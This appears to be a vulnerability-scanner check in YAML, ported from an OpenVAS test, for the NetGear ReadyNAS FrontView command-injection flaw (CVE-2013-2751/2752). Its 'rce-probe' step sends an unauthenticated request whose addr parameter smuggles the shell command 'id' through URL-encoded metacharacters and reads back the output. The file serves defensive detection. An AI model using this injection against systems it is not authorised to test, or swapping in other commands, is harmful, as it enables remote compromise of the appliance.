@@ -1,0 +1,85 @@
+# NetGear RAIDiator (ReadyNAS) FrontView Command Injection — CVE-2013-2751 / CVE-2013-2752
+#
+# The ReadyNAS RAIDiator firmware (FrontView web interface) fails to sanitise
+# user input in /frontview/lib/np_handler.pl. An unauthenticated attacker can
+# inject shell commands through the `addr` query parameter of np_handler.pl and
+# have them executed on the appliance.
+#
+# Detection (two observable facts, both unauthenticated GETs):
+#   1. GET /np_handler/ returns the FrontView handler marker "Empty No Support".
+#   2. A crafted GET to np_handler.pl injecting the `id` command returns the
+#      command output (uid=…/gid=…), confirming command execution (QoD 97).
+#
+# The injection payload is URL-encoded (%22 %29 %3b %28 %60 %23); reqwest would
+# normalise it, so the request is sent verbatim over tcp_connect and matched on
+# resp.banner.
+#
+# Ported from OpenVAS/Greenbone NVT 2013/gb_netgear_readynas_62059.nasl
+# (GPL-2.0-only). Faithful to the source: exact URLs, payload and match patterns.
+uid: 0422ca25-8a5c-4454-b22b-f22564f867fe
+name: "NetGear RAIDiator (ReadyNAS) FrontView Command Injection (CVE-2013-2751/2752)"
+description: |
+  Tests NetGear ReadyNAS RAIDiator FrontView for unauthenticated command
+  injection in np_handler.pl. Confirms the vulnerable handler is present
+  (GET /np_handler/ → "Empty No Support") then injects the `id` command and
+  reads its output (uid=…/gid=…) back from the response.
+cves: [CVE-2013-2751, CVE-2013-2752]
+cvss: 10.0
+severity: critical
+category: command-injection
+confidence_base: 0.20
+tags: [netgear, readynas, raidiator, frontview, command-injection, rce]
+services: [http, https]
+author: noctis
+version: "1.0.0"
+references:
+  - "https://nvd.nist.gov/vuln/detail/CVE-2013-2751"
+  - "https://nvd.nist.gov/vuln/detail/CVE-2013-2752"
+  - "http://www.securityfocus.com/bid/62059"
+  # Ported from OpenVAS/Greenbone NVT 2013/gb_netgear_readynas_62059.nasl (GPL-2.0-only)
+
+steps:
+  # ── Gate: FrontView np_handler endpoint present ──────────────────────────
+  # Raw tcp_connect keeps the request path verbatim (self.path unaltered).
+  - id: handler-probe
+    action: tcp_connect
+    port: "{{port}}"
+    send: "GET /np_handler/ HTTP/1.0\r\nHost: {{target_host}}\r\n\r\n"
+    timeout_secs: 10
+    store_as: gate_resp
+
+  - id: handler-match
+    action: match
+    source: gate_resp.banner
+    pattern: "Empty No Support"
+    on_match:
+      finding:
+        confidence_delta: 0.45
+        qod: 75
+        evidence: "FrontView np_handler endpoint present (GET /np_handler/ → 'Empty No Support'): {{gate_resp.banner}}"
+      set_vars:
+        handler_present: true
+
+  # ── Command injection — execute `id`, read uid=/gid= output back ─────────
+  # Payload is URL-encoded (%22=" %29=) %3b=; %28=( %60=` %23=#); verbatim HTTP/1.0.
+  # The NASL also tries a $xml_payload_header variant of the same injection;
+  # the $html_payload_header variant below is representative.
+  - id: rce-probe
+    action: tcp_connect
+    port: "{{port}}"
+    send: "GET /np_handler/np_handler.pl?OPERATION=get&OUTER_TAB=tab_myshares&PAGE=User&addr=%22%29%3b$html_payload_header=%28%60id%60%29%3b%23 HTTP/1.0\r\nHost: {{target_host}}\r\n\r\n"
+    timeout_secs: 10
+    store_as: rce_resp
+    condition: "handler_present == true"
+
+  - id: rce-match
+    action: match
+    source: rce_resp.banner
+    pattern: "uid=[0-9]+.*gid=[0-9]+"
+    condition: "handler_present == true"
+    on_match:
+      finding:
+        confidence_delta: 0.75
+        qod: 97
+        evidence: "Command execution confirmed via np_handler.pl — 'id' output returned: {{rce_resp.banner}}"
+      stop: true
